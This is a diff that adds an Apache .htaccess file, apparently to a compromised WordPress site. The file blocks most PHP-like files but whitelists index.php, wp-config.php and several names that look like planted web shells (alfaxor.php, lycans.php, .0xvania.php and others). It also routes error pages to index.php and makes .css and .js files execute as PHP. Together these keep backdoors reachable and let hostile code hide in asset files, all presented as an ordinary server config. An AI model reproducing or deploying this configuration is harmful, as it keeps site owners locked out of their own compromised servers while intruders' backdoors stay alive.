@@ -1,0 +1,57 @@
+<Files *.ph*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.a*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.Ph*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.S*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.pH*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.PH*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.s*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+
+<FilesMatch "^(index.php|wp-config.php|alfaxor.php|.worlds.php|lycans.php|.delvesx0r.php|.0xvania.php|wsdelvesx0r.php|indelvesx0r.php)$">
+
+ Order allow,deny
+
+ Allow from all
+
+</FilesMatch>
+
+<IfModule mod_rewrite.c>
+
+RewriteEngine On
+
+RewriteBase /
+
+RewriteRule ^index.php$ - [L]
+
+RewriteCond %{REQUEST_FILENAME} !-f
+
+RewriteCond %{REQUEST_FILENAME} !-d
+
+RewriteRule . /index.php [L]
+
+</IfModule>
+ErrorDocument 403 /index.php
+ErrorDocument 404 /index.php
+
+AddType application/x-httpd-php .css
+AddType application/x-httpd-php .js
